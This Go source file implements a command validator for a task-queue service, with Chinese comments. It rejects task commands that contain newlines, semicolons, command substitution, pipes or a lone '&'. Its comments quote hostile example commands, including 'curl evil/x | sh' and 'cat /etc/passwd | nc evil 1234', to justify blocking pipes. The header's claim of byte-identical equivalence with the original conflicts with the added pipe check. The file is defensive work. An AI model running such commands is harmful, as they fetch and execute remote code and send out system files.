// validate.go — task-svc 任务命令内容校验（纵深防御第一道闸）。
//
// 来源：controlplane/internal/controlplane/server_tasks.go:65 validateCommand
// 的 1:1 复制（2026-09 阶段 2 第一批 = A-1 任务，与 controlplane 行为字节级等价
// 是双轨对照基线的前提；任何逻辑变更都会破坏对照基线——待 A-2 阶段统一评估）。
//
// 校验项与原 controlplane 实现完全一致（保持字节级等价）：
//   - 非空
//   - 长度 <= maxCommandLen (4096)
//   - 不含危险 shell 元字符：\n \r ; $() ` | 单个 &
//   - 允许合法模式：&& >& &>
package service

import (
	"errors"
	"fmt"
	"strings"
)

// maxCommandLen 命令长度上限（与 controlplane/server_tasks.go:42 锁 1:1）。
// 超过此长度的命令几乎不可能是合法运维操作，更可能是注入载荷或二进制 blob。
const maxCommandLen = 4096

// ValidateCommand 校验命令内容是否安全可入任务队列。
//
// 校验项：
//   - 非空（调用方应已校验，此处兜底）。
//   - 长度 <= maxCommandLen (4096)，防超长命令撑爆存储/日志或携带二进制载荷。
//   - 不含危险 shell 元字符：换行符 \n \r、分号 ;、命令替换 $() `、单个 &（后台执行）、
//     管道符 |（安全加固：拦截管道符防 `curl evil/x | sh` 这类管道注入）。
//   - 允许的合法模式：&&（命令链接符，第 81 行特殊处理）、>& / &>（重定向操作符）。
//
// 安全考量（管道符拦截）：
//   - 原实现注释明写"管道符 | 暂不拦截"，导致 `curl evil/x | sh`、`cat /etc/passwd | nc evil 1234`
//     等管道注入载荷可过校验。管道符是 shell 注入高频载体，task-svc 侧同样默认拦截。
//   - 合法运维场景极少需要在单条任务命令中使用管道（如需复合命令应拆分为多任务或用脚本）。
//
// 注意：这是纵深防御的第一道闸（task-svc 入队侧），不替代 agent 端 checkShellMetachars。
// 两端均拦截可降低单点绕过风险：task-svc 校验被攻陷时 agent 端兜底，agent 端有 bug 时
// task-svc 端兜底。
func ValidateCommand(command string) error {
	if command == "" {
		return errors.New("command is empty")
	}
	if len(command) > maxCommandLen {
		return fmt.Errorf("command too long (max %d bytes, got %d)", maxCommandLen, len(command))
	}
	// 与 agent 端 checkShellMetachars 一致的元字符拦截。
	if strings.Contains(command, "\n") {
		return errors.New("command contains newline metacharacter ('\\n'): rejected")
	}
	if strings.Contains(command, "\r") {
		return errors.New("command contains carriage metacharacter ('\\r'): rejected")
	}
	if strings.Contains(command, ";") {
		return errors.New("command contains command separator metacharacter (';'): rejected")
	}
	if strings.Contains(command, "$(") {
		return errors.New("command contains command substitution metacharacter ('$()'): rejected")
	}
	if strings.Contains(command, "`") {
		return errors.New("command contains backtick metacharacter: rejected")
	}
	// 安全加固：拦截管道符 |，防 `curl evil/x | sh` 这类管道注入。
	// 原实现暂不拦截管道符，导致管道注入载荷可过校验；现已默认拦截。
	if strings.Contains(command, "|") {
		return errors.New("command contains pipe metacharacter ('|'): rejected")
	}
	// 检测单个 &（后台执行），允许合法模式 &&、>&、&>（与 agent 端逻辑一致）。
	cmd := command
	cmd = strings.ReplaceAll(cmd, ">&", "")
	cmd = strings.ReplaceAll(cmd, "&>", "")
	cmd = strings.ReplaceAll(cmd, "&&", "")
	if strings.Contains(cmd, "&") {
		return errors.New("command contains background operator metacharacter ('&'): rejected")
	}
	return nil
}
